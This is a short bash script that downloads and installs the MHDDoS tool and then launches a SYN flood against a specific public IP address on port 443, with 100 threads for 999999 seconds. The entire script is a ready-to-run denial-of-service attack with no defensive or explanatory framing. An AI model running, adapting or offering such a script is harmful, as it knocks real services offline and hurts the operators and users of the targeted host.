#!/bin/bash
git clone https://github.com/MatrixTM/MHDDoS.git
sudo apt install python3-pip
cd MHDDoS/
pip install -r requirements.txt
python3 start.py syn 80.96.156.22:443 100 999999
